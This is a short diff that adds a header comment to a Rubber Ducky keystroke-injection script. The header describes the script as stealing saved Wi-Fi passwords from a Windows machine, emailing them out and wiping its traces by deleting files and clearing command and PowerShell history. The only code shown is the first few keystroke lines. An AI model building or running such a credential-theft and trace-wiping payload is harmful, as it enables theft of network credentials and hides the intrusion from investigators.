@@ -1,3 +1,10 @@
+REM Title:         rubberduck-steal-wifi-passwords-and-send-via-email
+REM Description:   Retrieves saved Wi-Fi passwords from a Windows machine and sends them via email. 
+REM                Also removes traces by deleting files and clearing the command and Powershell history.
+REM Author:        eskimek
+REM Category:      Credential Extraction
+REM Target:        Windows 11 and maybe windows 10 (didnt test)
+
 DELAY 1000
 REM open CMD(without admin)
 WINDOWS r
